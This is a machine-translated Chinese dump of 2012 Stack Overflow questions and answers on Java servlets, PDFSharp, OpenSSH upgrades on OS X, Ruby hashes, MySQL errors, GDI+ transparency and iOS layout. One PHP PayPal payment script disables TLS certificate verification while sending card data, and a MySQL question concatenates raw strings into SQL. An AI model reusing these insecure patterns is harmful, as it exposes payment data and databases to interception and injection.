out.println("</tr>");
out.println("<tr>");
for (int i = 0; i < ex.getExpenses().size(); i++) {
    out.println("<td > " + ex.getExpenses().get(i) + "</td>");

    if (i>0 && (i+1)%4==0) {
        out.println("<td><input type=\"checkbox\" name=\"checkbox\"></td>");
        out.println("</tr><tr>");

    }     
}
out.println("</tr>"); 
```

我需要做的是创建一个提交按钮来计算复选框的价值总和。例如，如果选中 NUMBER 1 和 2，则提交按钮应给出 5577.0 (VALUE 22.0+5555.0) 的结果。任何人都可以帮我吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-05-18T20:08:40.637

首先，您应该了解 JSP 并从 JSP 而不是从 servlet 生成 HTML 标记。

现在解决你的问题。这些行中的每一行都来自一个数据库表。所以这些行中的每一行都应该有一个 ID（主键）。将行的 ID 分配给复选框的值。当您提交表单时，servlet 将收到选中复选框的所有 ID。从数据库中获取这些 ID 对应的值，并对它们求和（或执行直接计算总和的查询）：

```
<input type="checkbox" name="checkedRows" value="${idOfCurrentRow}"> 
```

在处理表单提交的 servlet 中：

```
String[] checkedIds = request.getParameterValues("checkedRows"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T20:07:34.460

你可以通过

```
String[] values = req.getParameterValues("checkbox"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T20:10:13.057

更改此行：

> ```
> out.println("<td><input type=\"checkbox\" name=\"checkbox\"></td>"); 
> ```

读书：

```
out.println("<td><input type=\"checkbox\" name=\"selected\" value=\""+ex.getExpenses().get(i-1)+"\"></td>"); 
```

这将创建您可以通过值标签识别自己的复选框。我希望“数字”字段是主键之类的。

然后在下一次运行。您可以通过以下方式获取所有检查值：

```
String[] selected = request.getParameters("selected"); 
```

现在，您只需将数字相加即可。我不太明白您的费用清单从代码中的样子。这只是一个不起作用的插图，但可以为您提供如何做到这一点的想法：

```
int sum = 0;
for (int i = 0; i < ex.getExpenses().size(); i++)
  for(int selectedIndex = 0; selectedIndex < selected.length; ++selectedIndex)
    if (ex.getExpenses().get(i) == Integer.parseInt(selected[selectedIndex]))
      sum += ex.getExpenses().get(i-1); 
```

# asp.net - PDFSharp 似乎无法打开某些 PDF 文档

> ID：10658947
> 
> 赞同：0
> 
> 时间：2012-05-18T19:57:57.267
> 
> 标签：asp.net, .net, pdf, pdfsharp

我有一个程序可以为提交到网站的 PDF 添加第二页。我使用 C# 和 PDFSharp。大多数文档工作正常，但少数用户收到“对象引用未设置为对象实例”。

```
using PdfSharp;
using PdfSharp.Drawing;
using PdfSharp.Pdf;
using PdfSharp.Pdf.IO;
using PdfSharp.Drawing.Layout;

PdfDocument rosterInput = PdfReader.Open(FilePath, PdfDocumentOpenMode.Import);

PdfPage rpage = rosterInput.Pages[0]; 
```

错误发生在第二行。当我调试时，它显示 PageCount = 0，这很奇怪，因为它是一个 1 页文档。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-09-15T19:45:51.870

非常感谢您拯救了我的一天！，我改进解决方案的唯一建议是在 using 块上使用内存流，如下所示：

```
 Using memoryStream As MemoryStream = ReturnCompatiblePdf(File.FullName)
      Dim DocPdf As PdfDocument = PdfReader.Open(memoryStream, PdfDocumentOpenMode.Import)
      //Your code here.....
  End Using 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-09-09T09:05:25.750

我有同样的问题，但通过下面的代码解决，问题是 PDF 兼容性。

```
PdfSharp.Pdf.IO.PdfReader.Open(ReturnCompatiblePdf("PDF FILE PATH"), PdfSharp.Pdf.IO.PdfDocumentOpenMode.Import)

Private Function ReturnCompatiblePdf(ByVal sFilename As String) As MemoryStream

    Dim reader As New iTextSharp.text.pdf.PdfReader(sFilename)
    Dim output_stream As New MemoryStream

    ' we retrieve the total number of pages
    Dim n As Integer = reader.NumberOfPages
    ' step 1: creation of a document-object
    Dim document As New iTextSharp.text.Document(reader.GetPageSizeWithRotation(1))
    ' step 2: we create a writer that listens to the document
    Dim writer As iTextSharp.text.pdf.PdfWriter = iTextSharp.text.pdf.PdfWriter.GetInstance(document, output_stream)
    'write pdf that pdfsharp can understand
    writer.SetPdfVersion(iTextSharp.text.pdf.PdfWriter.PDF_VERSION_1_4)
    ' step 3: we open the document
    document.Open()
    Dim cb As iTextSharp.text.pdf.PdfContentByte = writer.DirectContent
    Dim page As iTextSharp.text.pdf.PdfImportedPage

    Dim rotation As Integer

    Dim i As Integer = 0
    While i < n
        i += 1
        document.SetPageSize(reader.GetPageSizeWithRotation(i))
        document.NewPage()
        page = writer.GetImportedPage(reader, i)
        rotation = reader.GetPageRotation(i)
        If rotation = 90 OrElse rotation = 270 Then
            cb.AddTemplate(page, 0, -1.0F, 1.0F, 0, 0, _
            reader.GetPageSizeWithRotation(i).Height)
        Else
            cb.AddTemplate(page, 1.0F, 0, 0, 1.0F, 0, _
            0)
        End If
    End While

    '---- Keep the stream open!
    writer.CloseStream = False

    ' step 5: we close the document
    document.Close()

    Return output_stream

End Function 
```

# homebrew - 使用自制软件在 OS X 上升级 openssh 以符合 PCI

> ID：10658950
> 
> 赞同：19
> 
> 时间：2012-05-18T19:58:04.930
> 
> 标签：homebrew, openssh, pci-compliance

OS X 10.7.4 上现有的 openssh 版本是 SSH-2.0-OpenSSH_5.6，不幸的是，它不符合 PCI 标准。所以，我需要升级它，我一直在尝试用 Homebrew 来升级它。

到目前为止，我所做的是：

```
brew tap homebrew/dupes
brew install openssh 
```

没问题，一切顺利，现在当我尝试时，`which ssh`我得到：

```
/usr/local/bin/ssh 
```

看起来不错，还`which sshd`给出了：

```
/usr/local/sbin/sshd 
```

并`ssh -v`正式报告：

```
OpenSSH_5.9p1, OpenSSL 0.9.8r 8 Feb 2011 
```

到现在为止还挺好。但这就是我不擅长的地方。22端口仍然使用OS安装版本，也就是说`telnet hostname 22`报：

```
SSH-2.0-OpenSSH_5.6 
```

我试过弄乱 /System/Library/LaunchDaemons/ssh.plist 没有运气。

所以，我的问题是（可能按重要性相反的顺序）：

1.  如何让我的 Homebrew 安装的 openssh 成为监听端口 22 的那个？
2.  如果我这样做，这会导致与 OS X 或其他软件发生冲突吗？
3.  首先，我的处理方式是合理的吗？
4.  我不是在想我应该做的事情吗？
5.  这是一个糟糕的想法吗？

我对没有通过 PCI 合规性扫描感到沮丧，需要弄清楚这一点，坦率地说，我正在考虑将我服务器上的所有电子商务网站都更改为 stripe.com，但我想弄清楚这一点. 另外，有谁知道openssh是否会在Mountain Lion中升级？

**编辑：**这是我在 /System/Library/LaunchDaemons/ssh.plist 中尝试的内容：

我只编辑了一行，更改：

```
<string>/usr/sbin/sshd</string> 
```

到

```
<string>/usr/local/sbin/sshd</string> 
```

然后我`sudo kill -HUP 1`按照下面@the-paul 的建议进行了尝试，并重新启动了 Mac。

从远程远程登录仍然显示`SSH-2.0-OpenSSH_5.6`

我的整个 ssh.plist 文件现在看起来像这样：[http ://pastie.org/private/qnhofuxomawjdypp9wgaq](http://pastie.org/private/qnhofuxomawjdypp9wgaq)

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-20T19:37:04.213

1.  像这样的守护进程在 OS X 上由 控制，而后者又由和`launchd`等目录中的文件配置。至少在 Lion 和 Snow Leopard 上，默认 ssh 守护进程由.`/System/Library/LaunchDaemons/``/Library/LaunchDaemons``/System/Library/LaunchDaemons/ssh.plist`

    您可以使用文本编辑器以root身份打开它，并将“ `Program`”键的值从`/usr/libexec/sshd-keygen-wrapper`您想要的路径更改；在你的情况下，这可能是`/usr/local/sbin/sshd`. 然后，您*还*需要更改第一个`ProgramArguments`字符串，即表示的字符串`/usr/sbin/sshd`，因为它是`launchproxy`. 然后，要重新加载，

    ```
    sudo launchctl unload -w /System/Library/LaunchDaemons/ssh.plist
    sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist 
    ```

2.  我不明白这应该如何导致与正常或行为良好的 OS X 软件发生任何冲突。

3.  是的，这对我来说似乎是一件非常合理的事情。安全很重要。

4.  这不是一个非常容易回答的问题。但几乎可以肯定，是的，和其他人一样 :^)

5.  没有。唯一真正要担心的是，您让 sshd 保持最新的安全性与操作系统一样或更好。如果您知道这个问题所提出的问题，那么我认为这对您来说不是问题。

编辑：更正了我的编辑建议`ssh.plist`（这次测试了）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-09-09T16:58:09.407

这就是我所做的。基于以上讨论。在 10.11.6 (El Capitan) 上成功测试

## 服务器

1.  编辑`/System/Library/LaunchDaemons/ssh.plist`以使相应的*键*反映...</p>

    ```
    <key>ProgramArguments</key>
        <array>
        <string>/usr/local/sbin/sshd</string>
        <string>-i</string>
    </array> 
    ```

2.  编辑 shell 脚本`/usr/libexec/sshd-keygen-wrapper`，使最后一个命令反映以下内容：

    ```
    exec /usr/local/sbin/sshd $@ 
    ```

3.  克隆`/etc/ssh/`目录内容：

    ```
    $ sudo cp /etc/ssh/ssh* /usr/local/etc/ssh/ 
    ```

4.  确保可靠的文件所有权和权限：

    ```
    $ sudo chmod 755 /usr/local/etc/ssh/
    $ sudo chmod 600 /usr/local/etc/ssh/*_key
    $ sudo chmod 644 /usr/local/etc/ssh/ssh{{,d}_config,*.pub}
    $ sudo chown -R root:wheel /usr/local/etc/ssh/ 
    ```

5.  重新加载 SSH 守护进程：

    ```
    $ sudo launchctl unload -w /System/Library/LaunchDaemons/ssh.plist
    $ sudo launchctl   load -w /System/Library/LaunchDaemons/ssh.plist 
    ```

    **注意：**例如，最后一个条目相当于`systemsetup -setremotelogin on`或激活系统偏好面板中的*共享*服务。

6.  确保从**Client**升级 OpenSSH ：

    ```
    $ ssh-audit <Server IP>
    # general
    (gen) banner: SSH-2.0-OpenSSH_7.8
    (gen) software: OpenSSH 7.8
    (gen) compatibility: OpenSSH 6.5+, Dropbear SSH 2013.62+
    (gen) compression: enabled (zlib@openssh.com) 
    ```

## 客户

1.  安装 OpenSSH：

    ```
    $ brew install openssh 
    ```

2.  克隆`/etc/ssh/`目录内容。

3.  确保可靠的文件所有权和权限。

# tabs - 在我管理的多个页面上设置页面选项卡

> ID：10658961
> 
> 赞同：0
> 
> 时间：2012-05-18T19:58:51.037
> 
> 标签：tabs, facebook-canvas

好的，我有我的主帐户，然后我有几个页面，我做了一个应用程序/页面选项卡，它可以工作并显示在正确的页面上。现在我想为我管理的另一个页面做另一个应用程序。我如何告诉应用程序要在哪个页面上？每当我尝试制作一个新的时，它都会让我以我的身份登录。所以我看到了第一个应用程序，当我添加一个新应用程序时，我看不到在哪里告诉它要在哪个页面上。所有应用程序都将存储在一个域中。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:06:55.910

您可以按照此处所述执行以下操作，[https://developers.facebook.com/docs/appsonfacebook/pagetabs/](https://developers.facebook.com/docs/appsonfacebook/pagetabs/)

作为页面选项卡应用程序开发人员，您可以提示用户安装页面选项卡应用程序，方法是在页面选项卡应用程序或网站中包含明确将用户定向到 /dialog/pagetab 端点的“安装此页面选项卡应用程序”链接：

```
https://www.facebook.com/dialog/pagetab?app_id=YOUR_APP_ID&next=YOUR_URL 
```

您可以在应用设置中找到 YOUR_APP_ID 和 YOUR_URL。

这将帮助您将任何应用程序添加到页面选项卡。

# ruby - 无法遍历哈希中的值

> ID：10658962
> 
> 赞同：-1
> 
> 时间：2012-05-18T19:58:55.430
> 
> 标签：ruby

我对Ruby很陌生。我正在拼凑这样的东西：

```
in_msg.updateComments.map{|c| c.each} do |comment| 
```

`in_msg.updateComments`是一个哈希。

但我得到了错误：

```
SyntaxError: /Users/alexgenadinik/projects/cmply/cmply-app/app/models/linked_in_update.rb:65: syntax error, unexpected kDO, expecting kEND
      in_msg.updateComments.map{|c| c.each} do |comment| 
```

知道如何正确执行此操作吗？

数据是这样进来的：

```
 "updateComments"=>{"values"=>[{"comment"=>"Sweet", "person"=>{"siteStandardProfileRequest"=>{"url"=>"http://www.linkedin.com/profile?viewProfile=&key=23676551&authToken=FHXz&authType=name&trk=api*a140290*s148640*"}, 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:09:48.600

首先。这是[Hash 对象](http://www.ruby-doc.org/core-1.9.3/Hash.html)的链接。我们不需要`map`方法来遍历哈希。通过 Hash 的迭代是使用`each`, `each_pair`, `each_key`,`each_value`方法完成的。有关用法和语法，请参阅先前提供的链接。

```
in_msg.updateComments.each do |key, value|
  p key #prints "values" string on first loop
  value.each do |k, v|
    p k #prints "comment", "person"
    p v #prints "Sweet", "{"siteStandardProfileRequest"=>{"url"=>"http://www.linkedin.com/profile?viewProfile=&key=23676551&authToken=FHXz&authType=name&trk=api*a140290*s148640*"}"
  end
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T20:02:12.247

看起来你对如何使用块感到困惑。

```
in_msg.updateComments.each do |key, value|
   # code here...
end 
```

或者

```
in_msg.updateComments.each {|key, value| code_here } 
```

**更新**：现在您发布了数据......看起来您有几个嵌套的哈希和数组。我建议找到一个关于 ruby​​ 数组和 ruby​​ 哈希的好教程。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T20:03:39.613

我相信您正在寻找的语法是这样的：

```
in_msg.updateComments.map { |c| 
  c.each  do |comment| 
     # do stuff for each comment
  end
} 
```

# sql - 无法连接到 sql server 计算机使用来宾而不是用户帐户

> ID：10658968
> 
> 赞同：0
> 
> 时间：2012-05-18T19:59:54.140
> 
> 标签：sql, sql-server-2005

我正在尝试设置与 sql 服务器的 odbc 连接。当我进行测试时，我收到以下消息：[Microsoft]ODBC SQL Server Driver][SQL Server]Login failed for user 'server\guest'

我不确定为什么它试图与访客帐户而不是我登录的用户连接。

我们已经确定问题出在服务器端，因为有 2 台机器无法连接到该服务器。服务器正在运行 xp pro sp3

# django - 安装 BitNami 后 Django 版本未从 1.3.1 更新到 1.4

> ID：10658972
> 
> 赞同：1
> 
> 时间：2012-05-18T20:00:15.490
> 
> 标签：django, bitnami

我下载了 BitNami 试图从 Django 1.3.1 升级到 1.4，但是当我在终端的 python shell 中打印 django.VERSION 时，我得到以下信息：

```
>>> print django.VERSION
(1, 3, 1, 'final', 0) 
```

我的 Django-1.3.1 仍然安装在我的 Documents 文件夹中（而我的 djangostack-1.4-1 位于我的 Applications 文件夹中）。当我将 Django-1.3.1 移到垃圾箱时，尽管没有任何改变。我还需要采取哪些其他步骤来完成更新过程？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T13:31:29.307

正如 waitinfratrain 所提到的，您可能没有使用 BitNami Stack 中包含的 Python 版本。您需要先加载 BitNami 环境，然后执行这些命令。

在[此链接](http://wiki.bitnami.org/Components/BitNami_console?highlight=environment)中，您可以找到如何加载 BitNami 环境。在您的情况下，环境脚本将被命名为`use_djangostack`.

# php - 如何在 CURL 响应中获取字段名称的值

> ID：10658975
> 
> 赞同：1
> 
> 时间：2012-05-18T20:00:27.307
> 
> 标签：php, string, parsing, curl

我首先想说我是 PHP 的初学者，至少可以说我的代码效率不高。

我目前遇到的问题是我想以某种方式解析 CURL 响应以获取多个字段名称值并将它们分配给一个变量。获得变量后，我将向客户显示一些字段，向数据库显示一些字段。我知道在使用 PayPal 的 API 时会发回哪些字段，但是我不确定如何从响应中“获取”它们。

这是我目前正在使用的脚本，同样不是很有效，但是在 CURL 请求之后我被卡住了。任何帮助是极大的赞赏！！

```
<?php
include_once "constants.php";

foreach ($_POST as $key => $value) {
    $value = urlencode(stripslashes($value));
    $wppro = "$key=$value";
}

$ipaddress = "216.113.168.139";
$creditcardtype = $_POST["creditcardtype"];
$acct = $_POST["acct"];
$expmo = $_POST["expmo"];
$expyear = $_POST["expyear"];
$cvv = $_POST["cvv"];
$firstname = $_POST["firstname"];
$lastname = $_POST["lastname"];
$street = $_POST["street"];
$street2 = $_POST["street2"];
$city = $_POST["city"];
$state = $_POST["state"];
$zip = $_POST["zip"];
$countrycode = $_POST["countrycode"];
$amt = $_POST["amt"];

$expdate = $expmo . $expyear; 
$method = "DoDirectPayment";

$nvp = "version=$version&method=$method&user=$api_user&pwd=$api_pwd&signature=$api_sig&ipaddress=$ipaddress&$creditcardtype=$creditcardtype&acct=$acct&expdate=$expdate&cvv=$cvv&firstname=$firstname&lastname=$lastname&street=$street&street2=$street2&city=$city&state=$state&zip=$zip&countrycode=$countrycode&amt=$amt";

$ch = curl_init();    // Starts the curl handler
curl_setopt($ch, CURLOPT_URL,$sburl); // Sets the paypal address for curl
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); // Returns result to a variable instead of echoing
curl_setopt($ch, CURLOPT_TIMEOUT, 60); // Sets a time limit for curl in seconds (do not set too low)
curl_setopt($ch, CURLOPT_POST, 1); // Set curl to send data using post
curl_setopt($ch, CURLOPT_POSTFIELDS, $nvp); // Add the request parameters to the post
$httpResponse = curl_exec($ch); // run the curl process (and return the result to $result
curl_close($ch); 
```

谢谢，

马特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T21:41:47.580

这个怎么样？它不是超级优雅，但我认为它会起作用。

```
$response = 'TIMESTAMP=2012-05-18T21:18:41Z&CORRELATIONID=c864cbb25fc2d&ACK=Success&VERSION=87&BUILD=2929894&AMT=1.00&CURRENCYCODE=USD&AVSCODE=X&CVV2MATCH=M&TRANSACTIONID=6AS92013633623055';

$response = explode('&',$response);

$data = array();
foreach($response AS $key => $value){
    $newValues = explode('=',$value);
    $data[$newValues[0]] = $newValues[1];
} 
```

结果`print_r($data)`...

```
Array
(
    [TIMESTAMP] => 2012-05-18T21:18:41Z
    [CORRELATIONID] => c864cbb25fc2d
    [ACK] => Success
    [VERSION] => 87
    [BUILD] => 2929894
    [AMT] => 1.00
    [CURRENCYCODE] => USD
    [AVSCODE] => X
    [CVV2MATCH] => M
    [TRANSACTIONID] => 6AS92013633623055
) 
```

# wcf - Silverlight 正在调用不再存在的服务

> ID：10658976
> 
> 赞同：0
> 
> 时间：2012-05-18T20:00:27.557
> 
> 标签：wcf, silverlight, iis

在我的 silverlight 应用程序中，我有两个 wcf 服务，以前是一个，但由于实用性，我不得不拆分它们。在我的电脑上的调试模式下它工作正常，但是当我在服务器上发布网站（通过 IIS 7.0）时，它一直在调用旧服务（不再存在）。例如：旧服务被称为Item，后来被分为两个不同的服务，分别称为Clients 和 Workshops。

使用提琴手我发现服务项目在它甚至不再存在时仍在被调用。我尝试更新、删除、添加服务、更改其配置、手动编辑 clientconfig 以及 web.config，但没有任何效果。该应用程序在我的电脑上运行良好。

我是否忘记了任何内容，例如具有旧参考的文件？或者这是一个银光问题？在过去的 13 个小时里，我一直在努力解决这个问题，但没有明显成功。我非常感谢任何形式的帮助。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:29:48.103

您可以使用带有指定端点的具体构造函数来构建服务代理实例，硬编码。（对于初学者来说，为了使其工作，一旦它工作，您可以弄清楚如何在需要时使其可配置）。

如果您只调用此构造函数创建的代理上的方法，则它无法调用某些旧服务。

还要检查您部署的版本是否真的在浏览器中运行，可能是一个缓存的版本。（但这肯定是一个很长的镜头）。

# entity-framework - 导航属性的 EntityFramework 集合

> ID：10658977
> 
> 赞同：0
> 
> 时间：2012-05-18T20:00:45.943
> 
> 标签：entity-framework, asp.net-mvc-4, asp.net-web-api

我是 EntityFramework 的新手，我环顾四周，但找不到我的问题的答案。

我从现有数据库创建了一个 EDM，然后我创建了一个 DbContext Generator，它生成了以下内容：

![在此处输入图像描述](../Images/3c609d811ce68f049b53a9dbdc3837a4.png)

但是，因为每个专辑都应该有多个曲目，所以我将专辑类更改为：

![在此处输入图像描述](../Images/f8b77c6c3f04b7c123e0a3f4d1896ecb.png)

我知道只是更改这样的代码不会很好，并且几乎期待此代码中的错误：

![在此处输入图像描述](../Images/1d2c10bf411f3962eff0c9b2be0d5e43.png)

我对如何使用导航属性*集合*感到困惑，因为 EDM DbContext Generator 没有为集合生成代码。

感谢您的时间。

# php - webapp 的 Linux (ubuntu) 权限 - 独特的情况

> ID：10658979
> 
> 赞同：1
> 
> 时间：2012-05-18T20:00:58.767
> 
> 标签：php, linux, web-applications, lampp

我在 LAMPP 上运行了一个典型的 web 应用程序——这是典型的结果。webapp 的用户如何访问它是通过在本地安装一个 Ubuntu VM（虚拟机）。他们在 VM 中打开浏览器并访问 index.php（webapp 的登录页面）。

现在，我希望 webapp 能够访问 htdocs 目录，但我不希望当前登录的用户（“webappUser”）能够打开/读取 htdocs 中的任何源文件。

例子：

用户 1：webappAdmin - 对 htdocs 具有 root 访问权限

用户 2：webappUser - 没有对 htdocs 的读/写访问权限

有人有什么建议吗？感谢您的帮助！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:08:29.140

Apache 拥有自己的用户（通常是 ubuntu 上的 www-data），而不是以登录用户身份访问文件。我要做的是将htdocs文件夹添加到webappAdmin：webappAdmin，将www-data添加到webappAdmin组并将文件夹的权限设置为640（webappAdmin具有读/写权限，www-data可以读取文件并为它们提供服务，并且其他任何人，包括 webappUser，根本没有访问权限）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T20:16:38.763

好吧，如果您可以为用户提供预构建的 VHD（或您用于虚拟机的任何格式），那么您可以在分发之前设置用户。有了它，您可以为每个文件夹设置适当的权限，如果需要，甚至可以为每个文件设置适当的权限。在 Ubuntu 中创建一个非 root/limited/guest 帐户并分发该登录信息。但是，精明的用户仍然可以通过[单用户模式](https://askubuntu.com/questions/73442/how-do-i-login-in-single-user-mode)登录，无论如何都有效地获得了 root 权限。

我建议做的是在您拥有应用程序的服务器上创建一个本地受限帐户（因为您说他们*需要*本地服务器访问权限）并安装[VNC Server](https://help.ubuntu.com/community/VNC/Servers)。从那里，您将 VNC 地址和有限的本地帐户凭据分发给需要访问的人。

# ruby-on-rails-3 - 找不到“Make”命令（与 Less 关联）

> ID：10658983
> 
> 赞同：0
> 
> 时间：2012-05-18T20:01:29.890
> 
> 标签：ruby-on-rails-3, node.js, makefile, less

我安装了 Nodejs，然后安装了 LESS 命令行编译器。

```
 $ npm install -g less uglify-js 
```

从这里：http: [//twitter.github.com/bootstrap/less.html#compiling](http://twitter.github.com/bootstrap/less.html#compiling)

现在运行`Make`命令时出现以下错误。

```
 sh.exe": make: command not found 
```

任何线索为什么？非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-19T05:26:09.317

您没有可用的 GNU`make`实用程序。您可以通过多种方式获得收益：

*   获取 Make for Windows [http://gnuwin32.sourceforge.net/packages/make.htm](http://gnuwin32.sourceforge.net/packages/make.htm)
*   在 Windows 上获取 cygwin 并安装 make 包[http://www.cygwin.com/](http://www.cygwin.com/)
*   使用 Linux 虚拟机，它可能会默认安装 GNU make

我相信还有其他的可能性，这些是我现在能想到的。

# sql - 在 SQL Server 中执行表后丢失最后一行

> ID：10658984
> 
> 赞同：1
> 
> 时间：2012-05-18T20:01:31.363
> 
> 标签：sql, sql-server

我在 SQL Server 中创建了非常简单的表。

```
CREATE TABLE [dbo].[Teams](
    [TeamID] [uniqueidentifier] NOT NULL,
    [Name] [nvarchar](50) NOT NULL
) ON [PRIMARY]

ALTER TABLE [dbo].[Teams] ADD  CONSTRAINT [DF_Teams_TeamID]  DEFAULT (newid()) FOR [TeamID] 
```

我用数据填充它，执行它，它会丢失最后一行。这不取决于我输入了多少行，它总是会丢失最后一行。它发生在我所有的桌子上，我不明白为什么？我错过了什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T20:02:43.227

这是通过 SSMS 设计器吗？如果是这样，将光标移动到下一行，这将确保插入您之前所在的行，否则 SSMS 会认为您仍处于编辑模式

# css - div内的绝对定位

> ID：10658987
> 
> 赞同：0
> 
> 时间：2012-05-18T20:01:41.090
> 
> 标签：css

我正在制作我的网站，我想知道是否可以制作这样的东西：

我的 HTML 如下所示：

```
<div id="box1"><div class="box2"></div></div> 
```

CSS：

```
#box1{width:300px; height:100px; position:relative; background:#ccc;}
#box1 .box2{width:100px; height:100px; position:absolute; top:20px; background:#999;} 
```

我希望 .box2 位于距离 #box1 顶部 20px 的位置，但是这样它距离页面顶部 20px。请帮助如何解决这个问题？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:04:52.747

您的代码工作正常。div 位于页面顶部，因此内部 div 距离外部 div 和页面顶部均为 20px。请参阅我的示例[http://jsfiddle.net/unD7H/](http://jsfiddle.net/unD7H/)

# mysql - MYSQL php 错误 1064

> ID：10658992
> 
> 赞同：0
> 
> 时间：2012-05-18T20:02:13.743
> 
> 标签：mysql, mysql-error-1064

我不断收到此错误，无法找出问题所在。任何帮助，将不胜感激。谢谢。

sql -`"INSERT INTO practices (order,name,url) VALUES ('1','Business & Corporate Law','business-corporate-law')"`

错误：`1064You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'order,name,url) VALUES ('1','Business & Corporate Law','business-corporate-law')' at line 1`

这是php：

```
$sql =  "INSERT INTO ".$table." (".$cols.") VALUES (".$vals.")";
$result = mysql_query($sql);
if(!$result){die('Error: ' . mysql_errno() . mysql_error());} 
```

$table 为“practices”，$cols 为“order,name,url”，$vals 为“'1','Business & Corporate Law','business-corporate-law'”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:07:56.597

`order`是 SQL 中的关键字，因此如果将其用作列名（或一般的标识符），则必须将其包装如下：

```
INSERT INTO practices ( `order`, `name`, `url` ) 
  VALUES ('1','Business & Corporate Law','business-corporate-law') 
```

# c# - 使用 Graphics.DrawImage() 绘制具有透明度/Alpha 通道的图像

> ID：10658994
> 
> 赞同：21
> 
> 时间：2012-05-18T20:02:20.437
> 
> 标签：c#, .net, drawimage, alpha-transparency

我正在复制图像。（我的实际代码正在调整图像大小，但这与我的问题无关。）我的代码看起来像这样。

```
Image src = ...

using (Image dest = new Bitmap(width, height))
{
    Graphics graph = Graphics.FromImage(dest);
    graph.InterpolationMode = InterpolationMode.HighQualityBicubic;
    graph.DrawImage(src, 0, 0, width, height);
    dest.Save(filename, saveFormat);
} 
```

`src`除非从带有透明胶片（如 GIF）或 alpha 通道（如 PNG）的图像加载，否则这似乎工作得很好。

如何`DrawImage()`将透明胶片/Alpha 通道传输到新图像，然后在保存文件时保留它们？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-05-19T00:28:04.227

很不清楚，你没有说的很多。透明度最大的问题是你看不到它。您跳过了几个步骤，没有明确指定新位图的像素格式，根本没有初始化它，也没有说明使用的输出格式。有些不支持透明度。因此，让我们制作一个清晰的版本。从在paint.net中看起来像这样的PNG图像：

![在此处输入图像描述](../Images/730afa77bdf0636e1fe8b87b62524970.png)

使用此代码

```
 using (var src = new Bitmap("c:/temp/trans.png"))
        using (var bmp = new Bitmap(100, 100, PixelFormat.Format32bppPArgb)) 
        using (var gr = Graphics.FromImage(bmp)) {
            gr.Clear(Color.Blue);
            gr.DrawImage(src, new Rectangle(0, 0, bmp.Width, bmp.Height));
            bmp.Save("c:/temp/result.png", ImageFormat.Png);
        } 
```

生成此图像：

![在此处输入图像描述](../Images/986ba5f69b1f90680c07dd150a68c0f3.png)

您可以清楚地看到蓝色背景，因此透明度有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-10T13:03:28.260

我发现这个线程是因为我遇到了同样的问题（即 DrawImage 没有复制 alpha 通道），但在我的情况下，这仅仅是因为我忽略了我使用`PixelFormat.Format32bppRgb`而不是`PixelFormat.Format32bppArgb`. Lukasz M 在评论中所说的差不多。

# ios - 设置 UIView 以根据 UILabel 调整大小

> ID：10658996
> 
> 赞同：3
> 
> 时间：2012-05-18T20:02:22.090
> 
> 标签：ios, xcode, uiview, alignment, uilabel

![截屏](../Images/58e4330bd36647a43f3ecb911406fa6a.png)

我想让我的 UILabel 在叠加层中水平和垂直居中显示，并且我希望叠加层 UIView（在时髦的 lorem ipsum 文本后面带有浅色 alpha 的黑色区域）调整大小以给我 10 个像素的填充顶部和底部，但仍会自动拉伸其宽度。谁能指出我正确的方向？我想让它尽可能动态。

这是我必须让它看起来像这样：

```
 descView = [[UIView alloc] initWithFrame:CGRectMake(0, 64, self.view.bounds.size.width, 160)];
    descView.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    descView.backgroundColor = [UIColor colorWithWhite:0 alpha:0.5];

    descLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, 600, 120)];
    descLabel.center = CGPointMake(self.view.bounds.size.width/2, descView.bounds.size.height/2);

    descLabel.backgroundColor = [UIColor clearColor];
    descLabel.opaque = NO;
    descLabel.textAlignment = UITextAlignmentCenter;

    descLabel.text = currentPhoto.desc;
    descLabel.numberOfLines = 5;

    descLabel.textColor = [UIColor whiteColor];
    descLabel.autoresizingMask = UIViewAutoresizingFlexibleMargins;

    CGRect frame = descLabel.frame;
    frame.origin.x = (descView.frame.size.width - descLabel.frame.size.width)/2;

    descLabel.frame = frame;

    [self.view addSubview:descView];
    [descView addSubview:descLabel]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:28:50.113

使用[https://gist.github.com/2596057](https://gist.github.com/2596057)（那是 Marco Arment 的子类 UILabel）

（或）您可以使用 resizeHeightToFitText 方法的代码来做同样的事情，而不使用 hte IPInsetLabel

一旦标签的大小适合文本，根据高度和宽度设置标签的原点